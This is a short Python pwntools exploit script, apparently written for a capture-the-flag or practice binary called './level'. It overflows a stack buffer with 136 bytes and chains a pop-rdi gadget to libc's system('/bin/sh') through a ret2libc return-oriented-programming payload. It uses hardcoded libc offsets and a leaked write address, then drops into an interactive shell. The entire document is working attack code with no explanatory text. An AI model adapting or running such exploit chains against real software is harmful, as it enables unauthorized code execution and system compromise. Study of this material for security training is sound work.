from pwn import *

""" VA from __libc_csu_init """
pop_rbx = 0x40121b
pop_rdi_ret = 0x401223

""" offset from database """
offset___libc_start_main_ret = 0x24083
offset_system = 0x0000000000052290
offset_dup2 = 0x000000000010e8c0
offset_read = 0x000000000010dfc0
offset_write = 0x000000000010e060
offset_str_bin_sh = 0x1b45bd
offset___libc_start_main = 0x0000000000023f90
offset_puts = 0x0000000000084420
offset_exit = 0x0000000000046a40

""" addr of functions in libc """
addr_write = 0x7ffff7ed0060

libcBase = addr_write - offset_write

addr_system = libcBase + offset_system  # shell function addr

addr_str_bin_sh = libcBase + offset_str_bin_sh  # parameter

addr_exit = libcBase + offset_exit  # exit function

# io = process('./level')

io = gdb.debug("./level","break main")

# payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)

payload = b'a' * 136 + p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)

io.sendline(payload)

io.interactive()

